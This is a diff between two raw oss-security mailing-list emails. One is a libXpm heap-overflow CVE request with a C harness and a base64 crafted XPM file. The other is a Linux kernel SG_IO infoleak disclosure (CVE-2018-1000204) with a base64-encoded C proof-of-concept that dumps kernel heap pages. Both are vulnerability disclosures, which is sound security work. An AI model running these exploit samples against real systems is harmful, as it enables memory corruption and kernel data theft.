@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["4097" "Sunday" "22" "January" "2017" "14:22:51" "+0100" "Tobias Stoeckmann" "tobias@stoeckmann.org" "<20170122132251.GA11536@pepper.home.stoeckmann.org>" "112" "[oss-security] CVE Request: libXpm < 3.5.12 heap overflow" nil nil nil "1" "2017012213:22:51" "[oss-security] CVE Request: libXpm < 3.5.12 heap overflow" (number mark "U       tobias@stoec Jan 22  112/4097  " thread-indent "\"[oss-security] CVE Request: libXpm < 3.5.12 heap overflow\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["3823" "Friday" "8" "June" "2018" "19:38:27" "+0200" "Alexander Potapenko" "glider@google.com" "<CAG_fn=VEy8E4C4gTC2wZ-FSma5Lh5c5mtxTmhfdFKN_TSjvggQ@mail.gmail.com>" "83" "[oss-security] CVE-2018-1000204: Linux kernel 3.18 to 4.16 infoleak due to incorrect handling of SG_IO ioctl" nil nil nil "6" "2018060817:38:27" "[oss-security] CVE-2018-1000204: Linux kernel 3.18 to 4.16 infoleak due to incorrect handling of SG_IO ioctl" (number mark "U       glider@googl Jun  8   83/3823  " thread-indent "\"[oss-security] CVE-2018-1000204: Linux kernel 3.18 to 4.16 infoleak due to incorrect handling of SG_IO ioctl\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 32640 invoked by uid 550); 22 Jan 2017 14:17:07 -0000
+Received: (qmail 13628 invoked by uid 550); 8 Jun 2018 17:38:52 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,140 +12,121 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 9375 invoked from network); 22 Jan 2017 13:23:07 -0000
-Date: Sun, 22 Jan 2017 14:22:51 +0100
-From: Tobias Stoeckmann <tobias@stoeckmann.org>
-To: oss-security@lists.openwall.com
-Message-ID: <20170122132251.GA11536@pepper.home.stoeckmann.org>
+Received: (qmail 13605 invoked from network); 8 Jun 2018 17:38:51 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=google.com; s=20161025;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=Fe97+x+PLAfNn95earKzfw/FHwgfYQNQ/zchO5YdWXY=;
+        b=Ac7166AiGJ9XAub//mjePTanxqV1pg0kte1gmF76Q5l1xOEdq3+kWfHM25eG58Uh7v
+         h3UaxgKPWOIxGFxIbxJ5AylBf6UwQoch7E23NOBn0PjUZyqGWVnFIQhHZhacYrlery0i
+         C87h6uEuwrozZ5lAhlPOjbP/NvOTKVkzUzRgam/FkMrZp/nN2j9ddG3hes9SDCcLCU1U
+         GgIiLnfTFmFeeD+rokXVlP4V5mEauRylfLN6aiLO+MpSbLBnwEokJxvZzwFWdSgILsTn
+         WsT82Ol4ql+IA2E+LRnyIDni8iARhVRo6KwLqUfzfZvu9ucv6M5P7LKKIPmsaQCaTZEo
+         BTYQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=Fe97+x+PLAfNn95earKzfw/FHwgfYQNQ/zchO5YdWXY=;
+        b=J7EgWRsCoLQBlGx8PIF5ucB+QhzivRIyD7YKV9pbF6Awm3jhciwMjAd7wurCQBsq6p
+         F2bfevcWw522yblnbQKjf5BMRAhLQn5+3TkarZD70A2RHM9Jms1BTJxwTEiofG1NLR7A
+         T8d4rLsH8FKiFR9KrWK9ixijNS/h86YZbPpk7KiXdgesH/yHJ/EPvfVYxzsJHaceVcTx
+         R7JGxtDEstVWTJWQyw9JmP2W1aFZ0YbeGjvOmJicIame2ihHva8qzcxzbh9fNoBmkTOm
+         wuacvDhKLXendmaoL2UZNHNm1D5HjM1MgFWS/LeCwXTEdBdhVwSgOzaczqkrQDiWHNeK
+         jkfQ==
+X-Gm-Message-State: APt69E2bbAL+iXYb2Ti1UFJjlxPOHUZ748HEqPDoeOUGSP70AmHu3pIr
+	w895m6/T0vddRDU/KZhgQBEvT3OUsY3gQPOmwOI+xjR7n4E=
+X-Google-Smtp-Source: ADUXVKJ1e1ixb51GoUMyJltA0q2gwVyuPFyUbqlbFutGDVbEyqz6Br8c7b6s/hB/eAa7nbLrr5FLATCmYZ92LOcQjV0=
+X-Received: by 2002:ab0:11e3:: with SMTP id q35-v6mr4784693uac.162.1528479519389;
+ Fri, 08 Jun 2018 10:38:39 -0700 (PDT)
 MIME-Version: 1.0
-Content-Type: multipart/mixed; boundary="qvbW/XusmWuEbpm3"
-Content-Disposition: inline
-X-Provags-ID: V03:K0:Q4S+Dp+0ezmE70n6XeoxSJzhtPM3eB8hoWlqpSN5pTw7Kr5CZYa
- exg5fZn1lW5QrwpFYIjmZB7/9h8l9rvAFnegBUJxEbAUXG2M0P0+H+k1B0UH8pvHqbjRMaF
- Do5v9qCkZSqDnFJ+U+YT+A6CT5h5r0zl35aA6EzoHpDO5Ewhq6YMViCjbkCv4ebrwYknyZP
- /0nA8CcfGQTvBh0ZV/Rmw==
-X-UI-Out-Filterresults: notjunk:1;V01:K0:AJrC90oXJaY=:zCApi3nqW1qCtPu54/QDnH
- Wbq0z6RgJZadDhl6mqpnKV+dhF9ZVSjAdzZXlTYQdAvF/AXcd/DaM1vIRx9D5x/9ob5yrmJCj
- NL/LDZJ4YeXFP/FVt95SH/hMnpf3zPfYdxOl1F563sEw+AaRmoXLMwDSdsPPDYkW5jPnnRPkU
- WPmXq2ZvZR/Web2DRwohFBMLrLlvcN7Dbai8PWn3I3sowoKQ+/insSNoTmCpS48vIRIDC2F2L
- 1gFVZDHD4hXcHKCDueamvKkHtwiLyVzdpERZLn3zSGibH/nZy4QbLy+duAo8VR+oyGFCNZbcL
- w44gqbqWl7pr2yp3j6pEb6vaZFPLdcBkNLZuLWLAVbHcTXH/62k0V5vikhryba5OyO0WxGlbV
- 0auEHStjuvrggA2eLX4PHBdTyrfWQ4xm+BXuFnVkq2UkVgCHBoZSRqgXb55pOg+A7XeE4e6FP
- 2nb2AgeY2+BoGK1ik0iVTaMvrf3fpqxhUIVNVMbwmZKASQ7vD/stUhALXlZ/ZQV8/p/PKD4U/
- LWy5i8t9Wj5MHVH5Qh9MTl6Ep92jPtBQNDYE5BMIeII95VX/b63z1pirzhvOA7pdqxcwpEqH8
- 45+hoH4hgBwAKoaZaHRBmh5z33PtWv+b+3gab0kQSIc5GK/nSjSEMMzwXrnM5EjlKx+mFzy9s
- C/hVMDL1Zn3j56ZaTCw9xIJCwPJ56LAKoGJvHWLp7OszVb8uzQmBrk3S8IC61nA2F+lg=
-Subject: [oss-security] CVE Request: libXpm < 3.5.12 heap overflow
+From: Alexander Potapenko <glider@google.com>
+Date: Fri, 8 Jun 2018 19:38:27 +0200
+Message-ID: <CAG_fn=VEy8E4C4gTC2wZ-FSma5Lh5c5mtxTmhfdFKN_TSjvggQ@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: multipart/mixed; boundary="000000000000cd5739056e24de81"
+Subject: [oss-security] CVE-2018-1000204: Linux kernel 3.18 to 4.16 infoleak due to incorrect
+ handling of SG_IO ioctl
 
---qvbW/XusmWuEbpm3
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
+--000000000000cd5739056e24de81
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 
-SUMMARY
-=======
-An out of boundary write has been found in libXpm < 3.5.12 which can be
-exploited by an attacker through maliciously crafted XPM files.
+Hi all,
 
-PREREQUISITE
-============
-For this vulnerability to step in, a program must explicitly request
-to also parse XPM extensions while reading files. The motif toolkit and
-xdm are two among some programs that set the flag (XpmReturnExtensions).
-It can only be exploited on 64 bit systems.
+Linux Kernel version 3.18 to 4.16 incorrectly handles an SG_IO ioctl
+on /dev/sg0 (or any other SCSI device) with
+dxfer_direction=3DSG_DXFER_FROM_DEV and an empty 6-byte cmdp.
+This may lead to copying up to 1000 kernel heap pages to the userspace.
+See the PoC exploit attached.
 
-DETAILS
-=======
-The affected code is prone to two 32 bit integer overflows while parsing
-extensions: the amount of extensions and their concatenated length. The
-fact that two such overflows exist makes it possible to have full
-control of the memory management. The attacker can choose:
+This bug has been fixed in the upstream kernel already:
+https://github.com/torvalds/linux/commit/a45b599ad808c3c982fdcdc12b0b8611c2=
+f92824,
+and CVE-2018-1000204 has been assigned to it.
 
-- how much heap space is allocated
-- how many bytes will overflow
-- the content of the bytes that overflow
+The problem has limited scope, as users don't usually have permissions
+to access SCSI devices. On the other hand, e.g. the Nero user manual
+suggests doing `chmod o+r+w /dev/sg*` to make the devices accessible.
 
-Due to the integrated gzip compression in XPM files, the file can be
-as small as 4 MB to trigger this issue, and doesn't need to be larger
-than 8 MB for a fully arbitrary attack.
+--=20
+Alexander Potapenko
+Software Engineer
 
-PROOF OF CONCEPT
-================
-I have attached two files: poc.c is a vulnerable program that uses
-libXpm to parse an XPM file, including its extensions. The second file
-is a maliciously crafted XPM file, which is gzip-compressed thrice to
-reduce its size to be friendlier for e-mail transmissions. You have to
-gunzip it twice, which increases its size back to 4 MB. If used with a
-vulnerable version, the program will trigger a segmentation fault.
+Google Germany GmbH
+Erika-Mann-Stra=C3=9Fe, 33
+80636 M=C3=BCnchen
 
-SOLUTION
-========
-It is recommend to update to the released libXpm version 3.5.12.
+Gesch=C3=A4ftsf=C3=BChrer: Paul Manicle, Halimah DeLaine Prado
+Registergericht und -nummer: Hamburg, HRB 86891
+Sitz der Gesellschaft: Hamburg
 
-The commit that fixes the issue can be found here:
-https://cgit.freedesktop.org/xorg/lib/libXpm/commit/?id=d1167418f0fd02a27f617ec5afd6db053afbe185
-
---qvbW/XusmWuEbpm3
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: attachment; filename="poc.c"
-
-#include <X11/Xlib.h>
-#include <X11/xpm.h>
-
-#include <err.h>
-#include <string.h>
-
-int
-main(int argc, char *argv[0])
-{
-	Display *d;
-	char *fname = argc > 1 ? argv[1] : "poc.xpm";
-	char **data;
-	XpmImage img;
-	XpmInfo info;
-
-	if ((d = XOpenDisplay(NULL)) == NULL)
-		err(1, "failed to open display");
-
-	memset(&info, 0, sizeof(info));
-	info.valuemask |= XpmReturnExtensions;
-	if (XpmReadFileToXpmImage(fname, &img, &info) != XpmSuccess)
-		err(1, "failed to parse image");
-
-	if (XpmCreateDataFromXpmImage(&data, &img, &info) != XpmSuccess)
-		err(1, "failed to create data");
-
-	return 0;
-}
-
-
---qvbW/XusmWuEbpm3
-Content-Type: application/x-gunzip
-Content-Disposition: attachment; filename="poc.xpm.gz.gz.gz"
+--000000000000cd5739056e24de81
+Content-Type: text/x-csrc; charset="US-ASCII"; name="sg_io_leak.c"
+Content-Disposition: attachment; filename="sg_io_leak.c"
 Content-Transfer-Encoding: base64
+Content-ID: <f_ji6956sg0>
+X-Attachment-Id: f_ji6956sg0
 
-H4sICG7qOlgAA3Jlc3VsdC54cG0uZ3p+Lmd6fgDtku1PU1ccx1saxK0Mlz1U
-Mug6kzm3xBYNkbqyWaNLJD7AC6OOVLkxDlksVAuUksl6mriFTYK4hcCmYmec
-EnGskyml6aQkndStakmg6Spt2rXYCit9EEof7z1z6b1t/4O9OeflN/km38/v
-fDhdq1dLFgQf0xjN9S2yxlZe+6kmXsNnCtqi3cn8KKwyh08WDPS8emd3ldE2
-Xc3bq7Czh3+82lvB531ZdfFwoSz14kNLKf/Evuu9JSc2rDcMlZu6D146/ufu
-sxbW+13Md7TF1971eku9S2UdvG0zHmlkviWSYtTdBbENO2IaGNLg4+61+A1h
-YhD6ObBcHzevAe6CIAhPW2JnsPgeRWCXDy7vIhJlhBg+4+OPOFCrEgMrlrjl
-TK4FT/W34RJIDUcawPIhPgjxYR+I8MFsDXFfH7sJF3wK2wwX+H0gqk6YIa4n
-rqri3cJk9CT0m3EtSNUAozB+SxX/GtPjcz3QxkkOC1fEYCjJ14eChMtJFIAg
-BpNYrFIfKKCl3wTEiGhNf3348+V/WseJI2TsgnLz9SLp66HvdZvlhWR4/idB
-UZM977fR9XPn6GT27aKzZ7897/CoIdCnW0WGVW1lJrcu/6l1vuMhm0GGb5+u
-kH3VSd/Wwvdm2weMV7pFSuvoF/bNZLR9BE9Kz4qUpra/HM1WMqT9Eaiv7dDQ
-cMGAWnuMzJSfPJ8Y3jTREJjMaS9svS1lhh73na/MrBkFwmop85StSCcKvEGG
-b9nubuwKsn7ABpe2ZAH9tpl1b66KPXB8l20fZHdWSOh1s680GzNrVoLG9yR0
-3uxRuelIhk/3/IqOvP/OmAP44UXB7waaSlvSkm0PeaYmuRNi0Y5AcWYNgW+9
-x52or/RLtOIMX3Rk47hIqRh4ZM0BbNjf2V7sKpcfy7ZrZaWPx/Lbm/bcz157
-Vs8ZHMsfa+x0cOUvZfjq+u7JmVPq6fiFLOBK48LLaxgdXsmDbPvmuZ0lGpq6
-6YWcayejntc0tP7FX3RPfs7wOUwjMQk9IRNgOYCX97HdR5Vme3dO2yL91MNy
-3eGuy167ESouuVmuEXabxr4lw3e6luXkbtdX+8Q55/n1xs4PCpGMSEZqDZKR
-4kMyUoBIxnQbyUiuQTJSfEhGChDJmG4jGck1SEaKD8lIASIZyTaSMb0GyUjx
-IRkpQCQj2UYyptcgGTN8SEYSEMlItpGM6TVIxgwfkpEERDKSbSQjuQbJSPEh
-GanPQjKm20hGcg2SkeJDMlLnQTKm20hGcg2SkeJDMlKA/5+McCU2j4XPcBJX
-OHboUccN+il4GRAliiepfmgog99gCQaBPTMIw0kwByzCyCFFUpVigL99cNLM
-IaYgjgs3tfZWHb8gpP0Lya6R5u0pAAA=
+I2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRlIDxwdGhyZWFkLmg+CiNpbmNs
+dWRlIDxzY3NpL3NnLmg+CiNpbmNsdWRlIDxzdGRpby5oPgojaW5jbHVkZSA8
+c3RkbGliLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHN5cy9p
+b2N0bC5oPgoKI2RlZmluZSBDTURfU0laRSA2CgojZGVmaW5lIE1JTl9TVFJM
+RU4gMQpwdGhyZWFkX211dGV4X3Qgb3V0X211dGV4ID0gUFRIUkVBRF9NVVRF
+WF9JTklUSUFMSVpFUjsKCnZvaWQgZHVtcF9idWYodW5zaWduZWQgY2hhciAq
+YnVmLCBpbnQgbGVuKSB7CiAgaW50IGksIG56ID0gMDsKICBmb3IgKGkgPSAw
+OyBpIDwgbGVuOyBpKyspIHsKICAgIGlmIChidWZbaV0pIHsKICAgICAgbnog
+PSAxOwogICAgICBicmVhazsKICAgIH0KICB9CiAgaWYgKCFueikKICAgIC8v
+IFRoZSBidWZmZXIgaXMgZW1wdHkuCiAgICByZXR1cm47CgogIHB0aHJlYWRf
+bXV0ZXhfbG9jaygmb3V0X211dGV4KTsKICBmb3IgKGkgPSAwOyBpIDwgbGVu
+OyBpKyspIHsKICAgIGlmIChidWZbaV0pIHsKICAgICAgaW50IHN0cl9sZW4g
+PSBzdHJsZW4oJmJ1ZltpXSk7CiAgICAgIC8vIFNob3J0IHN0cmluZyBwaWVj
+ZXMgYXJlIHRvbyBib3JpbmcuCiAgICAgIGlmIChzdHJfbGVuID49IE1JTl9T
+VFJMRU4pIHsKICAgICAgICB1bnNpZ25lZCBjaGFyICpjOwogICAgICAgIGZv
+ciAoYyA9ICZidWZbaV07IGMgPCAmYnVmW2kgKyBzdHJfbGVuXTsgYysrKSB7
+CiAgICAgICAgICBpZiAoKCpjID4gMTI3KSB8fCAoKCpjIDwgMzIpICYmICgq
+YyAhPSAxMCkgJiYgKCpjICE9IDEzKSkpICB7CiAgICAgICAgICAgICpjID0g
+JyAnOwogICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgIH0KICAgICAg
+ICB9CiAgICAgICAgLy8gRHVtcCB0aGUgYnVmZmVyLgogICAgICAgIGZwcmlu
+dGYoc3RkZXJyLCAiJXNcbiIsICZidWZbaV0pOwogICAgICB9CiAgICAgIGkg
+Kz0gc3RyX2xlbjsKICAgIH0KICB9CiAgcHRocmVhZF9tdXRleF91bmxvY2so
+Jm91dF9tdXRleCk7Cn0KCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2
+W10pCnsKICBpbnQgbnBhZ2VzID0gMTI4LCBwYWdlczsKICBpZiAoYXJnYyA+
+IDEpIHsKICAgIHBhZ2VzID0gYXRvaShhcmd2WzFdKTsKICAgIGlmIChwYWdl
+cyA+IDAgJiYgcGFnZXMgPCAxMDI0KQogICAgICBucGFnZXMgPSBwYWdlczsK
+ICB9CiAgaW50IGJ1Zl9zaXplID0gNDA5NiAqIG5wYWdlczsKCiAgaW50IGZk
+ID0gb3BlbigiL2Rldi9zZzAiLCBPX1JET05MWSk7CiAgaWYgKGZkID09IC0x
+KSB7CiAgICBmcHJpbnRmKHN0ZGVyciwgIm9wZW4gZmFpbGVkIVxuIik7CiAg
+ICByZXR1cm4gMTsKICB9CgogIGNoYXIgKm91dF9idWYgPSBjYWxsb2MoMSwg
+YnVmX3NpemUpOwogIGlmICghb3V0X2J1ZikgewogICAgZnByaW50ZihzdGRl
+cnIsICJjYWxsb2MgZmFpbGVkIVxuIik7CiAgICByZXR1cm4gMTsKICB9Cgog
+IGNoYXIgY21kW0NNRF9TSVpFXSA9IHt9OwogIHN0cnVjdCBzZ19pb19oZHIg
+aGRyOwogIG1lbXNldCgmaGRyLCAwLCBzaXplb2YoaGRyKSk7CiAgaGRyLmlu
+dGVyZmFjZV9pZCA9ICdTJzsKICBoZHIuZHhmZXJfZGlyZWN0aW9uID0gU0df
+RFhGRVJfRlJPTV9ERVY7CiAgaGRyLmNtZF9sZW4gPSBDTURfU0laRTsKICBo
+ZHIuZHhmZXJfbGVuID0gYnVmX3NpemU7CiAgaGRyLmR4ZmVycCA9IG91dF9i
+dWY7CiAgaGRyLmNtZHAgPSBjbWQ7CgogIGludCByZXQgPSBpb2N0bChmZCwg
+U0dfSU8sICZoZHIpOwogIGlmIChyZXQgPT0gLTEpIHsKICAgIGZwcmludGYo
+c3RkZXJyLCAiaW9jdGwgZmFpbGVkIVxuIik7CiAgfQogIGR1bXBfYnVmKG91
+dF9idWYsIGJ1Zl9zaXplKTsKICByZXR1cm4gMDsKfQo=
 
---qvbW/XusmWuEbpm3--
+--000000000000cd5739056e24de81--
